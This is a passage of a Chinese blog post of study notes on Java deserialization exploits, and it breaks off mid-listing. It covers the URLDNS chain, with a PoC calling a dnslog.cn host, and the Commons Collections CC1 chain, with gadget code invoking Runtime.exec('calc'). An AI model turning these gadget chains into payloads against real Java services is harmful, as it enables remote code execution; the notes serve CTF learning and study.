<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cc.tb9xxc.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230322154213647.png" alt="image-20230322154213647"></p>
<p>可以看到成功执行了。</p>
<p>不知道为什么我在本地jdk11的代码运行不了完整的demo，但在云上jdk11可以执行，–illegal-access&#x3D;warn（添加的VM选项）。</p>
<p>先跟进<code>HashMap</code>，看看其自己实现的<code>readObject()</code>函数，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       reinitialize();</span><br><span class="line"></span><br><span class="line">       ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">       <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">       <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">       lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">       HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">       s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">       <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// use defaults</span></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">           <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                      DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                      (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                      MAXIMUM_CAPACITY :</span><br><span class="line">                      tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">           <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">           threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">           <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">           SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">           <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">           Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">           table = tab;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">               putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>hash()</code>函数看看是如何实现的，当<code>key!=null</code>时会调用<code>hashCode()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于我们可以设置<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是handler.hashCode()代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the protocol part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">       <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">           h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the host part.</span></span><br><span class="line">       <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">       <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">           h += addr.hashCode();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">           <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">               h += host.toLowerCase().hashCode();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the file part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">       <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">           h += file.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the port part.</span></span><br><span class="line">       <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">           h += getDefaultPort();</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           h += u.getPort();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the ref part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">       <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">           h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code>。</p>
<p>即进行了DNS查询。</p>
<p>做做ctfshow的DNSURL题目。</p>
<p>这是网上的POC，我们根据代码看看我们需要分析些什么：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://xkesxe.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        code.set(u, -<span class="number">1</span>);</span><br><span class="line">        map.put(u, url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(map);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">stream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(map);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要注意的是URL实例u的hashcode不是-1，而是经过计算成为其他的值了。</p>
<p>所以要进行修改，而hashcode为private，所以需要code.setAccessible(true);</p>
<p><a href="https://cloud.tencent.com/developer/article/1015078">深入理解 Java 反射：Field （成员变量） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">CTF&#x2F;Java-序列化和反序列化-学习笔记.md at main · bfengj&#x2F;CTF (github.com)</a></p>
<p>Field来自java.lang.reflect.Field，很明显其跟反射有关。具体看上面链接。</p>
<p>下面是chatgPT问的一个base64序列化类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Serializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Serializable</span>&gt; String <span class="title function_">serializeToBase64</span><span class="params">(T object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Serializable</span>&gt; T <span class="title function_">deserializeFromBase64</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">object</span> <span class="operator">=</span> (T) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是main</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;Serialized Base64 string: &quot;</span> + base64String);</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> Base64Serializer.deserializeFromBase64(base64String);</span><br><span class="line">            System.out.println(<span class="string">&quot;Deserialized Person object: &quot;</span> + deserializedPerson);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="简化的CC1链子"><a href="#简化的CC1链子" class="headerlink" title="简化的CC1链子"></a>简化的CC1链子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                                &#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现能够运行，接kan下来我们需要理解其为什么能运行（看类的源码）、以及找条会调用readObject的类（之后再说）。</p>
<p>下面分析一下设计到的接口和类：</p>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a><strong>TransformedMap</strong></h4><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。</p>
<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a><strong>Transformer</strong></h4><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象。</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[]</span></span><br><span class="line"><span class="params">args)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"> <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊.</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line"> object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么执行put就会调用而且输入还是随便的呢？"><a href="#为什么执行put就会调用而且输入还是随便的呢？" class="headerlink" title="为什么执行put就会调用而且输入还是随便的呢？"></a>为什么执行put就会调用而且输入还是随便的呢？</h4><p>debug看一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230402110648800.png" alt="image-20230402110648800"></p>
<p>堆栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transformValue:173, TransformedMap (org.apache.commons.collections.map) ()</span><br><span class="line">put:220, TransformedMap (org.apache.commons.collections.map) (          return valueTransformer.transform(object);      value = transformValue(value);)</span><br><span class="line">main:23, CommonCollections1 (org.example) (outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);)</span><br></pre></td></tr></table></figure>

<p>先回调用一个ConstantTransformer得到了我们的Runtime，然后之后在下一个transfmer里面执行invoke，over。</p>
<h3 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1"></a>CC1</h3><h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
<p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的readObject 方法(这是8u71以前的代码，8u71以后做了一些修改)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span 